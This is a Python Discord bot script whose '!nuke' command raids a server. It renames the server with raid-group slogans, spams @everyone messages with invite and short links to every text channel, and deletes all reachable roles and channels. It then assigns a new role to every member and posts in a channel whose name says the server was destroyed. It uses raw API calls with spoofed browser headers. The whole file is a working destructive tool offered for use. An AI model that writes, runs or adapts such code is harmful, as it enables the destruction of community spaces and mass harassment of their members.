import asyncio
import aiohttp
import discord
from discord.ext import commands
import logging


NEW_SERVER_NAME = """M:p植民地"""
ROLE_NAME       = """Mp万歳 gg5ch"""
ROLE_COLOR      = 15548997
CHANNEL_NAME    = """gg5ch-このサーバーはmpにより破壊された"""

SPAM_MESSAGE   = """
@everyone 
# M:p万歳
## このサーバーはM:pにより破壊されました:joy: 
## らぷろむ主席万歳     ぱすた万歳
discord.gg/5ch
https://x.gd/SVod3
"""
FINISH_MESSAGE = f""" discord.gg/5ch """

TOKEN = ""

logging.getLogger('discord').setLevel(logging.CRITICAL)
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    pass

# === この部分を追加 ===
@bot.event
async def on_message(message):
    await bot.process_commands(message)

@bot.command(name="nuke")
async def true_destruction(ctx):
    g_id = ctx.guild.id
    token = bot.http.token
    
    ch_ids = [ch.id for ch in ctx.guild.channels]
    txt_ids = [ch.id for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
    role_ids = [r.id for r in ctx.guild.roles if r.id != g_id and not r.managed and r < ctx.guild.me.top_role]
    m_ids = [m.id for m in ctx.guild.members if not m.bot]

    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImphIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0OS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTQ5LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjU3MzQxMCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiY2xpZW50X2xhdW5jaF9pZCI6ImYzNjAzOGZmLTlmMTAtNDg0Ni1iMTQyLTM4Zjk5YTA2N2IyNiIsImxhdW5jaF9zaWduYXR1cmUiOiIyYzA3NDc2MC1iMDE2LTQ1YWAbODczNi1lZTM5YzQzOGI0MWYiLCJjbGllbnRfYXBwX3N0YXRlIjoiZm9jdXNlZCIsImNsaWVudF9oZWFydGJlYXRfc2Vzc2lvbl9pZCI6Ijk5NjhlMTI0LTQ3NGQtNDc3Zi04ODY2LWRmMGYxMWI5NzJlOSJ9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "ja,en-US;q=0.9,en;q=0.8"
    }

    p_name = {"name": NEW_SERVER_NAME}
    p_spam = {"content": SPAM_MESSAGE}
    p_role = {"name": ROLE_NAME, "permissions": "0", "color": ROLE_COLOR, "hoist": True}
    p_chan = {"name": CHANNEL_NAME, "type": 0}
    p_fini = {"content": FINISH_MESSAGE}

    async with aiohttp.ClientSession() as s:
        tasks = [
            s.patch(f"https://discord.com/api/v10/guilds/{g_id}", json=p_name, headers=headers),
            *[s.post(f"https://discord.com/api/v10/channels/{cid}/messages", json=p_spam, headers=headers) for cid in txt_ids],
            *[s.delete(f"https://discord.com/api/v10/guilds/{g_id}/roles/{rid}", headers=headers) for rid in role_ids],
            *[s.delete(f"https://discord.com/api/v10/channels/{cid}", headers=headers) for cid in ch_ids]
        ]

        async def build_and_reign():
            r_res, c_res = await asyncio.gather(
                s.post(f"https://discord.com/api/v10/guilds/{g_id}/roles", json=p_role, headers=headers),
                s.post(f"https://discord.com/api/v10/guilds/{g_id}/channels", json=p_chan, headers=headers)
            )
            r_data = await r_res.json()
            c_data = await c_res.json()
            
            n_rid = r_data.get("id")
            n_cid = c_data.get("id")

            if n_rid:
                await asyncio.gather(*[s.put(f"https://discord.com/api/v10/guilds/{g_id}/members/{mid}/roles/{n_rid}", headers=headers) for mid in m_ids], return_exceptions=True)
            if n_cid:
                await s.post(f"https://discord.com/api/v10/channels/{n_cid}/messages", json=p_fini, headers=headers)

        tasks.append(build_and_reign())

        await asyncio.gather(*tasks, return_exceptions=True)

bot.run(TOKEN)
